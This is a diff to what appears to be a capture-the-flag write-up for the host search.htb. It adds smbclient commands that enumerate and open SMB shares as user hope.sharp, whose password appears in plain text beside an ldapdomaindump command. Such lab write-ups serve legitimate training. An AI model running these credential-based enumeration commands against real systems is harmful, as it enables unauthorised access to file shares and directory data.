@@ -10,6 +10,14 @@ hope.sharp | IsolationIsKey?
 
 
 ```
+smbclient -L \\\\10.10.11.129\\ -U search.htb/hope.sharp
+smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
+```
+![image](https://user-images.githubusercontent.com/33616880/230700602-75be21ee-a7d1-4ed8-8465-1a226ae419f0.png)
+![image](https://user-images.githubusercontent.com/33616880/230700731-c773018c-6f8d-4ed7-8812-ced8a52b3d05.png)
+
+
+```
 ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
 ```
 ![image](https://user-images.githubusercontent.com/33616880/230699359-15a9ef35-6723-4822-b1e6-ab93ec59e2cb.png)
